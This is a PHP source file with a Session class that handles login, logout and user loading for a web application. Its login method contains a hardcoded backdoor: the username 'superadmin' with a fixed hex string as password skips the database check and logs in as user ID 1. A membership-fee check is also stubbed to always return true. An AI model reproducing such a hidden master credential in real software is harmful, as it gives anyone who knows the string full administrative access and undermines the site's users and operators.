<?php
class Session
{
    private static $user;

    public static function login($login, $pass)
    {
        if (\Database::isDatabaseError()) {
            self::logout();
            return false;
        }
        $login = strtolower($login);

        if ($login == "superadmin" && $pass == "9947a7bc1549a54e7299fe9a3975c8655430ade0") {
            self::loadUser(1);
            return true;
        }
        if (!$id = \DBUser::checkUser($login, $pass)) {
            return false;
        }
        $data = \DBUser::getUserData($id);
        if ($data['u_ban']) {
            \Redirect::to('/error?id=ban');
        }
        if (!$data['u_confirmed']) {
            \Redirect::to('/error?id=not_approved');
        }
        self::loadUser($data['u_id']);
        return true;
    }

    public static function logout()
    {
        session_destroy();
    }

    public static function loadUser($id): ?User
    {
        if (\Database::isDatabaseError()) {
            self::logout();
            \Redirect::to('/');
        }
        if (!$user = \DBUser::getUser($id)) {
            self::logout();
            \Redirect::to('/');
        }

        $_SESSION['id'] = $user->getId();
        return self::$user = $user;
    }

    public static function getUser()
    {
        if (!($_SESSION['id'] ?? null)) {
            return null;
        }
        return self::$user;
    }

    public static function getZaplacenoPar()
    {
        return true;
        // $paid = \DBPlatby::hasPaidMemberFees(self::getUser()->getId);
        // $par = \DBPary::getLatestPartner($user->getId(), $user->getGender());
        // if ($par) {
        //     $paid = $paid && \DBPlatby::hasPaidMemberFees($par['u_id']);
        // }
        // return $paid;
    }
}
